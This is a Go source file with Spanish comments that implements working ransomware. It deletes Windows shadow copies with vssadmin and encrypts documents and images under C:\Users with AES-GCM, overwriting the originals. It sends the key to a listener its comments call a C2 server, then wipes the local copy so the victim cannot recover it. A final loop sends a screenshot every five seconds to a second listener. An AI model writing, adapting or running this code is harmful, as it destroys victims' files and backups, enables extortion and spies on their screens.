package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"image/png"
	"io"
	"io/fs"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

// ---------------------------------------------------------------------
// 1. Eliminar Shadow Copies
func eliminarCopiasShadow() error {
	unidad := "C:"

	fmt.Println("Consultando copias de sombra…")
	cmd := exec.Command("vssadmin", "list", "shadows", "/for="+unidad)
	output, err := cmd.CombinedOutput()
	fmt.Println(string(output))
	if err != nil {
		return fmt.Errorf("error al consultar: %w", err)
	}

	fmt.Println("Eliminando copias de sombra…")
	cmd = exec.Command("vssadmin", "delete", "shadows", "/for="+unidad, "/all", "/quiet")
	output, err = cmd.CombinedOutput()
	fmt.Println(string(output))
	if err != nil {
		return fmt.Errorf("error al eliminar: %w", err)
	}
	fmt.Println("Shadow copies eliminadas.")
	return nil
}

// ---------------------------------------------------------------------
// 2. Buscar los archivos
func buscarArchivos(raiz string) ([]string, error) {
	var archivos []string
	extensiones := map[string]bool{
		".jpg": true, ".docx": true, ".xlsx": true,
		".pptx": true, ".pdf": true, ".png": true,
		".jpeg": true, ".gif": true,
	}
	raiz, err := filepath.Abs(raiz)
	if err != nil {
		return nil, err
	}
	err = filepath.WalkDir(raiz, func(ruta string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}
		if extensiones[strings.ToLower(filepath.Ext(d.Name()))] {
			archivos = append(archivos, ruta)
		}
		return nil
	})
	return archivos, err
}

// ---------------------------------------------------------------------
// 3. Función de cifrado (AES‑GCM)
func cifrarAES(datos []byte, key []byte) ([]byte, error) {

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = rand.Read(nonce); err != nil {
		return nil, err
	}
	// GCM.Seal incluye el nonce al principio
	return gcm.Seal(nonce, nonce, datos, nil), nil
}

// ---------------------------------------------------------------------
// 4. Función que envía la clave al que está a la escucha (yo)

func sendKey(key []byte, serverIP string, serverPort string) {
	address := serverIP + ":" + serverPort

	// Establecer conexión TCP reversa
	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatal("Error conectando al C2:", err)
	}
	defer conn.Close()

	// Enviar la clave al servidor
	_, err = conn.Write(key)
	if err != nil {
		log.Fatal("Error enviando clave:", err)
	}
}

// ---------------------------------------------------------------------
// 5. Limpia la clave para que la víctima no la pueda recuperar de ningún lado
func clearKey(key []byte) {
	for i := range key {
		key[i] = 0
	}
}

// ---------------------------------------------------------------------
// 6. Extra, yo he decidido que cada 5 segundos envíe una captura de pantalla a otro (yo) que esté a la escucha
func capturarPantalla(serverIP string, serverPort string) {
	interval := 5 * time.Second

	address := serverIP + ":" + serverPort

	conn, err := net.Dial("tcp", address)
	if err != nil {
		log.Fatal("Error conectando al C2:", err)
	}

	for {
		bounds := screenshot.GetDisplayBounds(0)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Printf("Error al capturar pantalla: %v", err)
			time.Sleep(interval)
			continue
		}

		var buf bytes.Buffer
		if err = png.Encode(&buf, img); err != nil {
			log.Printf("Error codificando PNG: %v", err)
			time.Sleep(interval)
			continue
		}
		data := buf.Bytes()

		size := uint32(len(data))
		sizeBuf := new(bytes.Buffer)
		if err = binary.Write(sizeBuf, binary.BigEndian, size); err != nil {
			log.Printf("Error creando encabezado: %v", err)
			time.Sleep(interval)
			continue
		}

		_, err = conn.Write(append(sizeBuf.Bytes(), data...))
		if err != nil {
			log.Printf("Error enviando datos: %v", err)
			time.Sleep(interval)
			continue
		}

		log.Printf("Enviada captura de %d bytes", size)

		time.Sleep(interval)
	}
}

func main() {
	// 1. Shadow copies
	if err := eliminarCopiasShadow(); err != nil {
		fmt.Println("No se pudieron eliminar las shadow copies:", err)
		// opcional: return
	}

	// 2. Buscar archivos
	archivos, err := buscarArchivos(`C:\Users`)
	if err != nil {
		fmt.Println("Error al buscar archivos:", err)
		return
	}
	fmt.Printf("Se encontraron %d archivos a cifrar.\n", len(archivos))

	// 3. Cifrar cada archivo

	key := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		return
	}

	for _, ruta := range archivos {
		// leer contenido
		plain, err := os.ReadFile(ruta)
		if err != nil {
			fmt.Println("No se pudo leer", ruta, ":", err)
			continue
		}
		// cifrar
		cifrado, err := cifrarAES(plain, key)
		if err != nil {
			fmt.Println("Error cifrando", ruta, ":", err)
			continue
		}
		// sobrescribir
		if err = os.WriteFile(ruta, cifrado, 0600); err != nil {
			fmt.Println("No se pudo escribir", ruta, ":", err)
			continue
		}
	}

	encoded := []byte(hex.EncodeToString(key))

	// 4. Enviar la clave a la dirección ip y puerto especificado
	sendKey(encoded, "127.0.0.1", "4444")

	//5. Ahora limpia la clave
	clearKey(key)

	// 6. Toma y envía las capturas de pantalla, de nuevo al puerto especificado
	capturarPantalla("127.0.0.1", "5555")

	fmt.Println("Proceso concluido.")
}
